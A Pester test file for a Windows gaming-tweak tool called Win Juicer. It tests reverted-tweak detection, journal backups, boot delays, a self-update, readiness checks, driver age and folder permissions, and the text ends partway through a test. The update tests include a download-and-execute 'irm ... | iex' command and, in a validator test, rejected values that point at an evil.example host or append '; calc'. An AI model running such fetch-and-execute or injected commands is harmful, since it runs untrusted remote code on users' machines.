# What Windows undid, the journal's spare copy, boot delays in the startup list,
# «Actualizar ahora», «Listo para jugar» and how old a graphics driver may be.
# Every test works on the in-memory machine and the throwaway home of Initialize-JuicerTest.

BeforeAll {
    . (Join-Path $PSScriptRoot 'TestHelpers.ps1')
    Initialize-JuicerTest

    # The files of the journal and nothing else in the home: this file's own folder.
    function Clear-FeatureJournal {
        foreach ($n in 'diario.json', 'diario.1.json', 'diario.dañado.json') { Remove-Item -LiteralPath (Join-Path (Get-JuicerHome) $n) -ErrorAction SilentlyContinue }
    }

    # An event as Get-WinEvent hands it back: an id, a time and the XML of its data.
    function New-FakeBootEvent {
        param([int]$Id, [datetime]$Time, [hashtable]$Data)
        $xml = '<Event><EventData>' + ((@($Data.Keys | ForEach-Object { '<Data Name="{0}">{1}</Data>' -f $_, $Data[$_] })) -join '') + '</EventData></Event>'
        $e = [pscustomobject]@{ Id = $Id; TimeCreated = $Time }
        $e | Add-Member -MemberType ScriptMethod -Name ToXml -Value ({ $xml }.GetNewClosure())
        $e
    }
}

Describe 'Qué ha cambiado: lo que Windows ha deshecho' {
    BeforeEach {
        $script:M = New-FakeMachine
        Clear-FeatureJournal
    }
    AfterEach { Clear-FeatureJournal }

    It 'no dice nada mientras todo sigue aplicado, y señala lo que se revirtió' {
        [void](Invoke-JuicerTweak (Find-JuicerTweak 'juegos.modo'))
        @(Get-JuicerDrift).Count | Should -Be 0
        # A feature update puts Game Mode's switch back.
        Write-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled' 'DWord' 0
        $d = @(Get-JuicerDrift)
        $d.Count | Should -Be 1
        $d[0].Id | Should -Be 'juegos.modo'
        $d[0].State | Should -Be 'Parcial'
        # Both undone: no longer «in part».
        Write-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AllowAutoGameMode' 'DWord' 0
        @(Get-JuicerDrift)[0].State | Should -Be 'Pendiente'
    }

    It 'un ajuste que nunca se aplicó no es un cambio deshecho' {
        # Pending but not in the journal: Win Juicer never applied it.
        @(Get-JuicerDrift).Count | Should -Be 0
        [void](Invoke-JuicerTweak (Find-JuicerTweak 'juegos.modo'))
        [void](Undo-JuicerTweak 'juegos.modo')
        @(Get-JuicerDrift).Count | Should -Be 0
    }

    It 'sigue también el «no» de una preferencia, que se llama igual con una admiración' {
        [void](Set-JuicerToggle (Find-JuicerTweak 'pref.oscuro') $false)
        Get-JuicerJournalEntry (Read-JuicerJournal) 'pref.oscuro!' | Should -Not -BeNullOrEmpty
        @(Get-JuicerDrift).Count | Should -Be 0
        $theme = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Themes\Personalize'
        Write-JuicerReg $theme 'AppsUseLightTheme' 'DWord' 0
        $d = @(Get-JuicerDrift)
        $d.Count | Should -Be 1
        $d[0].Id | Should -Be 'pref.oscuro!'
        (Resolve-JuicerJournalTweak 'pref.oscuro!').Id | Should -Be 'pref.oscuro!'
        Resolve-JuicerJournalTweak 'no.existe!' | Should -BeNullOrEmpty
        Resolve-JuicerJournalTweak 'app:Microsoft.BingNews' | Should -BeNullOrEmpty
    }

    It 'deja fuera lo que el motor se salta a propósito: no aplica y juegos abiertos' {
        # NoAplica: the build went below what the tweak needs, so its state says nothing.
        [void](Invoke-JuicerTweak (Find-JuicerTweak 'juegos.ventana'))
        @(Get-JuicerDrift).Count | Should -Be 0
        Write-JuicerReg 'HKCU\Software\Microsoft\DirectX\UserGpuPreferences' 'DirectXUserGlobalSettings' 'String' ''
        @(Get-JuicerDrift).Count | Should -Be 1
        Write-JuicerReg 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' 'CurrentBuildNumber' 'String' '20000'
        @(Get-JuicerDrift).Count | Should -Be 0
        Write-JuicerReg 'HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion' 'CurrentBuildNumber' 'String' '26100'
        @(Get-JuicerDrift).Count | Should -Be 1
    }

    It 'no cuenta el perfil de un juego que está abierto' {
        $M.Backend.State.FpsBackend = 'nvidia'
        [void](Invoke-JuicerTweak (New-JuicerFpsLimitTweak 'a.exe' 100))
        $M.Backend.State.FpsLimits.Remove('a.exe')
        # Not in the catalog: a stand-in so that the id resolves to its tweak.
        Mock -ModuleName WinJuicer Resolve-JuicerJournalTweak { New-JuicerFpsLimitTweak 'a.exe' 100 } -ParameterFilter { $Id -eq 'fps:a.exe' }
        @(Get-JuicerDrift).Count | Should -Be 1
        [void]$M.Backend.State.Running.Add('a.exe')
        @(Get-JuicerDrift).Count | Should -Be 0
    }

    It 'las cuentas y la lista dicen lo que toca' {
        (Format-JuicerDriftSummary @()).Title | Should -Be ''
        $one = Format-JuicerDriftSummary @(@{ Title = 'Modo juego'; State = 'Parcial' })
        $one.Title | Should -Be 'Windows ha deshecho 1 cambio tuyo'
        $one.Lines | Should -Be @('· Modo juego (en parte)')
        $many = Format-JuicerDriftSummary @(1..10 | ForEach-Object { @{ Title = "Ajuste $_"; State = 'Pendiente' } })
        $many.Title | Should -Be 'Windows ha deshecho 10 cambios tuyos'
        @($many.Lines).Count | Should -Be 9
        $many.Lines[-1] | Should -Be '· y 2 más'
    }

    It '-Revisar lista y no cambia nada; con -Si los vuelve a aplicar' {
        [void](Invoke-JuicerTweak (Find-JuicerTweak 'juegos.modo'))
        $ok = @(Start-Juicer -Revisar -Si 6>$null)
        $ok[-1] | Should -Be 0
        (Start-Juicer -Revisar 6>&1 | Out-String) | Should -BeLike '*Todo lo que aplicó Win Juicer sigue en su sitio*'
        Write-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled' 'DWord' 0
        Write-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AllowAutoGameMode' 'DWord' 0
        $text = (@(Start-Juicer -Revisar 6>&1) | Out-String)
        $text | Should -BeLike '*Windows ha deshecho 1 cambio tuyo*Modo juego*'
        @(Start-Juicer -Revisar 6>$null)[-1] | Should -Be 0
        (Read-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled').Value | Should -Be 0
        @(Start-Juicer -Revisar -Si -Simular 6>$null)[-1] | Should -Be 0
        (Read-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled').Value | Should -Be 0
        @(Start-Juicer -Revisar -Si -SinPuntoDeRestauracion 6>$null)[-1] | Should -Be 0
        (Read-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled').Value | Should -Be 1
        @(Get-JuicerDrift).Count | Should -Be 0
        # The original capture is kept: undoing still goes back to before Win Juicer.
        [void](Undo-JuicerTweak 'juegos.modo')
        Get-JuicerJournalEntry (Read-JuicerJournal) 'juegos.modo' | Should -BeNullOrEmpty
    }

    It 'volver a aplicar un ajuste Extremo sigue pidiendo -AceptoRiesgos' {
        # The prompt a person would answer: nothing typed, so the Extremo one is skipped.
        Mock -ModuleName WinJuicer Read-Host { '' }
        $t = @(Get-JuicerCatalog | Where-Object { $_.Level -ge 3 -and -not (Get-JuicerSkipReason $_) } | Select-Object -First 1)
        if ($t.Count -eq 0) { Set-ItResult -Skipped -Because 'no hay ajuste Extremo aplicable en esta máquina simulada'; return }
        $drift = @(@{ Id = $t[0].Id; Title = $t[0].Title; Tweak = $t[0]; State = 'Pendiente'; Level = 3 })
        $r = @(Invoke-JuicerDriftReapply $drift -NoRestorePoint)
        $r[0].Outcome | Should -Be 'NoAplica'
        $r[0].Message | Should -BeLike '*Extremo*'
    }

    It 'el mantenimiento al iniciar sesión lo apunta en el registro sin volver a aplicarlo' {
        Mock -ModuleName WinJuicer Get-JuicerGames { @() }
        Mock -ModuleName WinJuicer Get-JuicerPrimaryMonitor { $null }
        [void](Invoke-JuicerTweak (Find-JuicerTweak 'juegos.modo'))
        Write-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled' 'DWord' 0
        $log = Join-Path (Get-JuicerHome) 'registro.log'
        $before = if (Test-Path -LiteralPath $log) { [IO.File]::ReadAllText($log).Length } else { 0 }
        [void](Invoke-JuicerUpkeep -Quiet)
        [IO.File]::ReadAllText($log).Substring($before) | Should -BeLike '*Mantener: Windows ha deshecho 1 cambio tuyo: juegos.modo*'
        (Read-JuicerReg 'HKCU\Software\Microsoft\GameBar' 'AutoGameModeEnabled').Value | Should -Be 0
    }
}

Describe 'Copia del diario' {
    BeforeEach {
        $script:M = New-FakeMachine
        Clear-FeatureJournal
        $script:Backup = Get-JuicerJournalBackupPath
        $script:Aside = Get-JuicerJournalAsidePath
    }
    AfterEach { Clear-FeatureJournal }

    It 'cada guardado deja el diario anterior en diario.1.json' {
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() })
        Test-Path -LiteralPath $Backup | Should -BeFalse
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() }, @{ Id = 'b'; Title = 'B'; Actions = @() })
        @(([IO.File]::ReadAllText($Backup) | ConvertFrom-Json).Entries).Count | Should -Be 1
        (Read-JuicerJournal).Count | Should -Be 2
        Test-Path -LiteralPath "$Backup.tmp" | Should -BeFalse
        # The next one moves the two-entry file there.
        Save-JuicerJournal @(@{ Id = 'c'; Title = 'C'; Actions = @() })
        @(([IO.File]::ReadAllText($Backup) | ConvertFrom-Json).Entries).Count | Should -Be 2
    }

    It 'un diario dañado no pisa la copia buena' {
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() })
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() }, @{ Id = 'b'; Title = 'B'; Actions = @() })
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        Test-JuicerJournalFile (Get-JuicerJournalPath) | Should -BeFalse
        Test-JuicerJournalFile $Backup | Should -BeTrue
        Save-JuicerJournal @(@{ Id = 'z'; Title = 'Z'; Actions = @() })
        @(([IO.File]::ReadAllText($Backup) | ConvertFrom-Json).Entries).Count | Should -Be 1
    }

    It 'el error de un diario dañado dice que se puede restaurar, sólo si hay copia' {
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        $none = try { Read-JuicerJournal; '' } catch { "$_" }
        $none | Should -BeLike '*dañado*'
        $none | Should -Not -BeLike '*se puede restaurar*'
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() })
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() }, @{ Id = 'b'; Title = 'B'; Actions = @() })
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        $msg = try { Read-JuicerJournal; '' } catch { "$_" }
        $msg | Should -BeLike '*dañado*'
        $msg | Should -BeLike '*se puede restaurar*recuperarlo*'
    }

    It 'restaurar aparta el dañado y deja la copia como diario' {
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() })
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() }, @{ Id = 'b'; Title = 'B'; Actions = @() })
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        $r = Restore-JuicerJournal
        $r.Ok | Should -BeTrue
        $r.Entries | Should -Be 1
        (Read-JuicerJournal).Count | Should -Be 1
        (Read-JuicerJournal)[0].Id | Should -Be 'a'
        [IO.File]::ReadAllText($Aside) | Should -Be '{ esto no es json'
        # The copy is still there.
        Test-JuicerJournalFile $Backup | Should -BeTrue
    }

    It 'sin copia utilizable no toca nada' {
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        $r = Restore-JuicerJournal
        $r.Ok | Should -BeFalse
        [IO.File]::ReadAllText((Get-JuicerJournalPath)) | Should -Be '{ esto no es json'
        Test-Path -LiteralPath $Aside | Should -BeFalse
        [IO.File]::WriteAllText($Backup, 'tampoco')
        (Restore-JuicerJournal).Ok | Should -BeFalse
    }

    It '-RestaurarDiario: sale 0 si restaura y 1 si no hay copia' {
        @(Start-Juicer -RestaurarDiario -Si 6>$null)[-1] | Should -Be 1
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() })
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() }, @{ Id = 'b'; Title = 'B'; Actions = @() })
        [IO.File]::WriteAllText((Get-JuicerJournalPath), '{ esto no es json')
        @(Start-Juicer -RestaurarDiario 6>$null)[-1] | Should -Be 0
        (Read-JuicerJournal).Count | Should -Be 1
        Test-Path -LiteralPath $Aside | Should -BeTrue
        # A journal that reads fine is only replaced when -Si says so.
        Save-JuicerJournal @(@{ Id = 'a'; Title = 'A'; Actions = @() }, @{ Id = 'c'; Title = 'C'; Actions = @() })
        Mock -ModuleName WinJuicer Read-Host { 'n' }
        @(Start-Juicer -RestaurarDiario 6>$null)[-1] | Should -Be 1
        (Read-JuicerJournal).Count | Should -Be 2
        @(Start-Juicer -RestaurarDiario -Si 6>$null)[-1] | Should -Be 0
    }
}

Describe 'Tiempos de arranque en Programas de inicio' {
    It 'lee un evento: aplicación, controlador o servicio, y descarta lo que no dice nada' {
        $app = ConvertFrom-JuicerBootEvent 101 @{ Name = 'Steam.exe'; FriendlyName = 'Steam Client'; TotalTime = '20000'; DegradationTime = '12500' }
        $app.Kind | Should -Be 'app'
        $app.Seconds | Should -Be 12.5
        $app.Keys | Should -Contain 'steam.exe'
        (ConvertFrom-JuicerBootEvent 102 @{ Name = 'C:\Windows\System32\drivers\nvlddmkm.sys'; DegradationTime = '3000' }).Keys | Should -Contain 'nvlddmkm.sys'
        $svc = ConvertFrom-JuicerBootEvent 103 @{ Name = 'AdobeARMservice'; FriendlyName = 'Adobe Acrobat Update Service'; TotalTime = '4200' }
        $svc.Kind | Should -Be 'service'
        $svc.Seconds | Should -Be 4.2
        ConvertFrom-JuicerBootEvent 101 @{ Name = 'x.exe'; DegradationTime = '0'; TotalTime = '0' } | Should -BeNullOrEmpty
        ConvertFrom-JuicerBootEvent 101 @{ DegradationTime = '9000' } | Should -BeNullOrEmpty
        ConvertFrom-JuicerBootEvent 100 @{ Name = 'x.exe'; DegradationTime = '9000' } | Should -BeNullOrEmpty
        ConvertFrom-JuicerBootEvent 101 @{} | Should -BeNullOrEmpty
    }

    It 'de cada elemento gana el evento más reciente' {
        $now = Get-Date
        $events = @(
            (New-FakeBootEvent 101 $now.AddDays(-1) @{ Name = 'Steam.exe'; DegradationTime = '9000' })
            (New-FakeBootEvent 101 $now.AddDays(-9) @{ Name = 'Steam.exe'; DegradationTime = '30000' })
            (New-FakeBootEvent 103 $now.AddDays(-2) @{ Name = 'AdobeARMservice'; TotalTime = '4200' })
        )
        $d = ConvertFrom-JuicerBootEvents $events
        $d['steam.exe'] | Should -Be 9
        $d['adobearmservice'] | Should -Be 4.2
        $d.Count | Should -Be 2
    }

    It 'pide los eventos 101, 102 y 103 de los últimos 30 días y los ordena aunque lleguen al revés' {
        $now = Get-Date
        $script:Events = @(
            (New-FakeBootEvent 101 $now.AddDays(-9) @{ Name = 'Steam.exe'; DegradationTime = '30000' })
            (New-FakeBootEvent 101 $now.AddDays(-1) @{ Name = 'Steam.exe'; DegradationTime = '9000' })
        )
        Mock -ModuleName WinJuicer Get-JuicerEvents { , @($script:Events) }
        (Get-JuicerBootDelays)['steam.exe'] | Should -Be 9
        Should -Invoke -ModuleName WinJuicer Get-JuicerEvents -Times 1 -ParameterFilter {
            $Filter.LogName -eq 'Microsoft-Windows-Diagnostics-Performance/Operational' -and (@($Filter.Id) -join ',') -eq '101,102,103' -and $Filter.StartTime -lt (Get-Date).AddDays(-29)
        }
    }

    It 'si el registro no se puede leer, no hay datos (y no un cero)' {
        Mock -ModuleName WinJuicer Get-JuicerEvents { $null }
        (Get-JuicerBootDelays).Count | Should -Be 0
        Mock -ModuleName WinJuicer Get-JuicerEvents { , @() }
        (Get-JuicerBootDelays).Count | Should -Be 0
    }

    It 'enlaza cada entrada por el nombre de su archivo, o de su servicio' {
        $delays = @{ 'steam.exe' = 9.0; 'adobearmservice' = 4.2; 'discord.exe' = 1.5 }
        Get-JuicerStartupDelay @{ Kind = 'Registro'; Name = 'Steam'; Command = '"C:\Program Files (x86)\Steam\steam.exe" -silent' } $delays | Should -Be 9
        Get-JuicerStartupDelay @{ Kind = 'Registro'; Name = 'Steam'; Command = 'C:\Program Files\Steam\STEAM.EXE' } $delays | Should -Be 9
        Get-JuicerStartupDelay @{ Kind = 'Carpeta'; Name = 'Discord'; Command = 'C:\Users\a\AppData\Local\Discord\Update.exe --processStart Discord.exe' } $delays | Should -BeNullOrEmpty
        Get-JuicerStartupDelay @{ Kind = 'Servicio'; Name = 'Adobe Acrobat Update Service'; ServiceName = 'AdobeARMservice'; Command = 'AdobeARMservice' } $delays | Should -Be 4.2
        # Exact file names only: steamwebhelper.exe is not steam.exe.
        Get-JuicerStartupDelay @{ Kind = 'Registro'; Name = 'x'; Command = '"C:\Steam\bin\steamwebhelper.exe"' } $delays | Should -BeNullOrEmpty
        Get-JuicerStartupDelay @{ Kind = 'Registro'; Name = 'x'; Command = 'rundll32 foo.dll,Run' } $delays | Should -BeNullOrEmpty
        Get-JuicerStartupDelay @{ Kind = 'Registro'; Name = 'Steam'; Command = 'steam.exe' } @{} | Should -BeNullOrEmpty
        Get-JuicerStartupDelay @{ Kind = 'Registro'; Name = 'Steam'; Command = 'steam.exe' } $null | Should -BeNullOrEmpty
    }

    It 'la revisión de inicio lleva el tiempo sólo a las entradas con datos' {
        $m = New-FakeMachine
        $run = 'HKCU\Software\Microsoft\Windows\CurrentVersion\Run'
        Write-JuicerReg $run 'Steam' 'String' '"C:\Program Files (x86)\Steam\steam.exe" -silent'
        Write-JuicerReg $run 'Otro' 'String' '"C:\Otro\otro.exe"'
        Mock -ModuleName WinJuicer Get-JuicerBootDelays { @{ 'steam.exe' = 7.5 } }
        $items = @(Get-JuicerStartupReview)
        $steam = @($items | Where-Object { $_.Name -eq 'Steam' })[0]
        $steam.BootDelay | Should -Be 7.5
        $other = @($items | Where-Object { $_.Name -eq 'Otro' })[0]
        $other.ContainsKey('BootDelay') | Should -BeFalse
        # Windows' log unavailable: the list still comes.
        Mock -ModuleName WinJuicer Get-JuicerBootDelays { throw 'sin registro' }
        @(Get-JuicerStartupReview).Count | Should -BeGreaterThan 1
    }

    It 'enseña los segundos sin ceros, y señala los lentos' {
        Format-JuicerBootDelay $null | Should -Be ''
        Format-JuicerBootDelay 0 | Should -Be ''
        Format-JuicerBootDelay 7.5 | Should -Be '+7.5 s'
        Format-JuicerBootDelay 12.4 | Should -Be '+12 s'
        Test-JuicerBootDelaySlow $null | Should -BeFalse
        Test-JuicerBootDelaySlow 1.5 | Should -BeFalse
        Test-JuicerBootDelaySlow 2 | Should -BeTrue
    }
}

Describe 'Actualizar ahora' {
    It 'construye exactamente la orden publicada, en una PowerShell nueva que no se cierra' {
        $notice = Get-JuicerUpdateNotice -Local 'abc1234' -Latest { 'def5678' }
        $inv = Get-JuicerUpdateInvocation $notice.Command -HostPath 'C:\PS\pwsh.exe'
        $inv.FilePath | Should -Be 'C:\PS\pwsh.exe'
        $inv.Command | Should -Be $notice.Command
        $inv.ArgumentList | Should -Be "-NoProfile -ExecutionPolicy Bypass -NoExit -Command `"$($notice.Command)`""
        $inv.ArgumentList | Should -BeLike '*irm https://github.com/Chomp-wq/BtJuicer/releases/download/winjuicer/winjuicer.ps1 | iex"'
        # Without a command: the published one.
        (Get-JuicerUpdateInvocation -HostPath 'x').Command | Should -Be 'irm https://github.com/Chomp-wq/BtJuicer/releases/download/winjuicer/winjuicer.ps1 | iex'
        (Get-JuicerUpdateInvocation).FilePath | Should -Not -BeNullOrEmpty
    }

    It 'no ejecuta nada que no tenga la forma de la orden publicada' {
        foreach ($bad in 'irm https://evil.example/x.ps1 | iex', 'irm https://github.com/a/b/releases/download/x/y.ps1 | iex; calc', 'calc', 'irm https://github.com/a/b/releases/download/x/y.ps1 | iex | iex', '', 'irm https://github.com/a/b/releases/download/x/y.ps1 | iex "&" calc') {
            { Get-JuicerUpdateInvocation $bad -HostPath 'x' } | Should -Throw '*no es la publicada*'
        }
    }

    It 'lo arranca con esa orden y esos argumentos, sin hacer nada más' {
        Mock -ModuleName WinJuicer Start-Process { }
        Start-JuicerUpdate @{ Command = 'irm https://github.com/Chomp-wq/BtJuicer/releases/download/winjuicer/winjuicer.ps1 | iex'; Latest = 'x'; Local = 'y' }
        Should -Invoke -ModuleName WinJuicer Start-Process -Times 1 -ParameterFilter { $ArgumentList -like '*-NoExit -Command "irm https://github.com/*| iex"' }
        { Start-JuicerUpdate @{ Command = 'calc' } } | Should -Throw
        Should -Invoke -ModuleName WinJuicer Start-Process -Times 1
    }
}

Describe 'Listo para jugar' {
    It 'sin datos no dice nada: lo desconocido no es ni bueno ni malo' {
        @(Get-JuicerReadyStatus @{}).Count | Should -Be 0
        @(Get-JuicerReadyStatus @{ GameMode = $null; HagsConfigured = $null; Windowed = $null; Rebar = $null; PlanKind = $null; OnBattery = $null; MonitorHz = 0; MonitorMaxHz = 0 }).Count | Should -Be 0
        # Off Windows nothing can be read (on Windows, the real PC answers).
        if (-not (& (Get-Module WinJuicer) { Test-JuicerWindows })) { @(Get-JuicerReady).Count | Should -Be 0 }
    }

    It 'un equipo en regla: todo con marca buena' {
        $r = @(Get-JuicerReadyStatus @{ GameMode = $true; HagsConfigured = $true; HagsRestart = $false; Windowed = $true; Rebar = $true; PlanKind = 'Rendimiento'; CpuMax = 100; OnBattery = $false; MonitorHz = 165; MonitorMaxHz = 165 })
        @($r | ForEach-Object { $_.Key }) | Should -Be @('modo', 'hags', 'ventana', 'rebar', 'energia', 'bateria', 'monitor')
        @($r | Where-Object { -not $_.Ok }).Count | Should -Be 0
        ($r | Where-Object { $_.Key -eq 'energia' }).Title | Should -Be 'Plan de energía: máximo rendimiento'
        ($r | Where-Object { $_.Key -eq 'monitor' }).Title | Should -Be 'Monitor a su frecuencia máxima (165 Hz)'
    }

    It 'cada aviso lleva su motivo' {
        $r = @(Get-JuicerReadyStatus @{ GameMode = $false; HagsConfigured = $false; Windowed = $false; Rebar = $false; PlanKind = 'Economizador'; OnBattery = $true; MonitorHz = 60; MonitorMaxHz = 165 })
        @($r | Where-Object { $_.Ok }).Count | Should -Be 0
        foreach ($l in $r) { $l.Reason | Should -Not -BeNullOrEmpty -Because $l.Key }
        ($r | Where-Object { $_.Key -eq 'monitor' }).Title | Should -Be 'Monitor a 60 Hz, admite 165 Hz'
        ($r | Where-Object { $_.Key -eq 'bateria' }).Title | Should -Be 'Funcionando con batería'
    }

    It 'HAGS configurada pero sin reiniciar no está activa' {
        $r = @(Get-JuicerReadyStatus @{ HagsConfigured = $true; HagsRestart = $true })
        $r.Count | Should -Be 1
        $r[0].Ok | Should -BeFalse
        $r[0].Title | Should -BeLike '*configurada, pero aún no activa*'
        $r[0].Reason | Should -BeLike '*reiniciar*'
    }

    It 'el plan de energía capado a menos de 100 % avisa aunque sea el de rendimiento; un portátil enchufado va bien' {
        $r = @(Get-JuicerReadyStatus @{ PlanKind = 'Rendimiento'; CpuMax = 80; OnBattery = $false })
        ($r | Where-Object { $_.Key -eq 'energia' }).Ok | Should -BeFalse
        ($r | Where-Object { $_.Key -eq 'energia' }).Title | Should -BeLike '*80 %*'
        ($r | Where-Object { $_.Key -eq 'bateria' }).Ok | Should -BeTrue
        (@(Get-JuicerReadyStatus @{ PlanKind = 'Equilibrado'; CpuMax = 100 }))[0].Title | Should -Be 'Plan de energía: Equilibrado'
        # A desktop: no battery line at all.
        @(Get-JuicerReadyStatus @{ PlanKind = 'Equilibrado'; OnBattery = $null } | Where-Object { $_.Key -eq 'bateria' }).Count | Should -Be 0
    }

    It 'conoce los planes de energía por su GUID' {
        Get-JuicerPlanKind '5f1c7a4e-3b2d-4e8a-9c61-7d0b2a9e4f13' | Should -Be 'Rendimiento'
        Get-JuicerPlanKind 'E9A42B02-D5DF-448D-AA00-03F14749EB61' | Should -Be 'Rendimiento'
        Get-JuicerPlanKind '8c5e7fda-e8bf-4a96-9a85-a6e23a8c635c' | Should -Be 'Rendimiento'
        Get-JuicerPlanKind '381b4222-f694-41f0-9685-ff5bb260df2e' | Should -Be 'Equilibrado'
        Get-JuicerPlanKind 'a1841308-3541-4fab-bc81-f71556f20b4a' | Should -Be 'Economizador'
        Get-JuicerPlanKind '11111111-2222-3333-4444-555555555555' | Should -Be 'Otro'
        Get-JuicerPlanKind '' | Should -BeNullOrEmpty
    }

    It '-Estado la enseña y sale 0' {
        $text = (@(Start-Juicer -Estado 6>&1) | Out-String)
        $text | Should -BeLike '*Listo para jugar*'
        @(Start-Juicer -Estado 6>$null)[-1] | Should -Be 0
    }
}

Describe 'Antigüedad del driver de la gráfica' {
    It 'avisa a los seis meses en una dedicada, con la web del fabricante' {
        Get-JuicerDriverAgeFinding 'NVIDIA GeForce RTX 4070' 180 | Should -BeNullOrEmpty
        $n = Get-JuicerDriverAgeFinding 'NVIDIA GeForce RTX 4070' 181
        $n.Severity | Should -Be 'Medio'
        $n.Title | Should -BeLike '*más de seis meses (181 días)*'
        $n.Detail | Should -BeLike '*https://www.nvidia.com/drivers*'
        $a = Get-JuicerDriverAgeFinding 'AMD Radeon RX 7800 XT' 200
        $a.Detail | Should -BeLike '*https://www.amd.com/support*'
        $i = Get-JuicerDriverAgeFinding 'Intel(R) Arc(TM) A770 Graphics' 200
        $i.Detail | Should -BeLike '*https://www.intel.com/content/www/us/en/support/detect.html*'
        $i.Title | Should -BeLike '*seis meses*'
    }

    It 'una integrada espera un año' {
        Get-JuicerDriverAgeFinding 'Intel(R) UHD Graphics 770' 200 | Should -BeNullOrEmpty
        Get-JuicerDriverAgeFinding 'Intel(R) UHD Graphics 770' 365 | Should -BeNullOrEmpty
        $f = Get-JuicerDriverAgeFinding 'Intel(R) UHD Graphics 770' 366
        $f.Title | Should -BeLike '*más de un año*'
        $f.Detail | Should -BeLike '*intel.com/content/www/us/en/support/detect.html*'
        Get-JuicerDriverAgeFinding 'AMD Radeon(TM) Graphics' 300 | Should -BeNullOrEmpty
        (Get-JuicerDriverAgeFinding 'AMD Radeon(TM) Graphics' 400).Detail | Should -BeLike '*amd.com/support*'
    }

    It 'sin edad conocida o de otra marca no dice nada' {
        Get-JuicerDriverAgeFinding 'NVIDIA GeForce RTX 4070' -1 | Should -BeNullOrEmpty
        Get-JuicerDriverAgeFinding 'Microsoft Basic Display Adapter' 900 | Should -BeNullOrEmpty
        Get-JuicerDriverAgeFinding '' 900 | Should -BeNullOrEmpty
    }
}

Describe 'Programas externos con tiempo máximo' {
    BeforeAll {
        $script:Pwsh = (Get-Process -Id $PID).Path
        # Not exported: called from inside the module.
        function Invoke-TestNative {
            param([string]$File, [string[]]$Arguments, [int]$TimeoutSec = 30)
            & (Get-Module WinJuicer) { param($f, $a, $t) Invoke-WinNative $f $a -TimeoutSec $t } $File $Arguments $TimeoutSec
        }
    }

    It 'convierte los argumentos como los espera CreateProcess' {
        ConvertTo-JuicerArgumentString @('a', 'b c', '') | Should -Be 'a "b c" ""'
        ConvertTo-JuicerArgumentString @('x"y') | Should -Be '"x\"y"'
        ConvertTo-JuicerArgumentString @('C:\mi carpeta\') | Should -Be '"C:\mi carpeta\\"'
        ConvertTo-JuicerArgumentString @() | Should -Be ''
    }

    It 'devuelve código y salida (stdout y stderr, sin líneas vacías)' {
        $r = Invoke-TestNative $script:Pwsh @('-NoProfile', '-Command', "'hola'; [Console]::Error.WriteLine('fallo'); exit 3")
        $r.Code | Should -Be 3
        $r.Output | Should -BeLike '*hola*'
        $r.Output | Should -BeLike '*fallo*'
        $r.Output | Should -Not -Match "(?m)^\s*$"
    }

    It 'mata lo que no acaba a tiempo y lo cuenta con código -1' {
        $sw = [Diagnostics.Stopwatch]::StartNew()
        $r = Invoke-TestNative $script:Pwsh @('-NoProfile', '-Command', 'Start-Sleep -Seconds 30') 2
        $sw.Stop()
        $r.Code | Should -Be -1
        $r.Output | Should -BeLike '*tiempo de espera*'
        $sw.Elapsed.TotalSeconds | Should -BeLessThan 20
    }

    It '0 es sin límite: lo que tarda un poco acaba con su salida' {
        $r = Invoke-TestNative $script:Pwsh @('-NoProfile', '-Command', 'Start-Sleep -Seconds 1; ''listo''') 0
        $r.Code | Should -Be 0
        $r.Output | Should -Be 'listo'
    }
}

Describe 'Permisos de la carpeta de Win Juicer' -Skip:([Environment]::OSVersion.Platform -ne 'Win32NT') {
    BeforeAll {
        function New-TestHomeAcl {
            param([bool]$Protected = $true, [string]$OwnerSid = 'S-1-5-32-544', [string]$UserRights = 'ReadAndExecute', [string]$UserSid = 'S-1-5-32-545')
            $sidType = [Security.Principal.SecurityIdentifier]
            $acl = New-Object Security.AccessControl.DirectorySecurity
            $acl.SetAccessRuleProtection($Protected, $false)
            $acl.SetOwner((New-Object $sidType $OwnerSid))
            $inherit = [Security.AccessControl.InheritanceFlags]'ContainerInherit,ObjectInherit'
            $none = [Security.AccessControl.PropagationFlags]::None
            $allow = [Security.AccessControl.AccessControlType]::Allow
            foreach ($f in 'S-1-5-32-544', 'S-1-5-18') { $acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule ((New-Object $sidType $f), 'FullControl', $inherit, $none, $allow))) }
            $acl.AddAccessRule((New-Object Security.AccessControl.FileSystemAccessRule ((New-Object $sidType $UserSid), $UserRights, $inherit, $none, $allow)))
            $acl
        }
    }

    It 'reconoce un ACL que ya es el bueno y no lo vuelve a fijar' {
        Test-JuicerHomeAcl (New-TestHomeAcl) | Should -BeTrue
    }

    It 'lo cambia si hereda, si el dueño no es administrador o si Users puede escribir' {
        Test-JuicerHomeAcl (New-TestHomeAcl -Protected $false) | Should -BeFalse
        Test-JuicerHomeAcl (New-TestHomeAcl -OwnerSid 'S-1-5-32-545') | Should -BeFalse
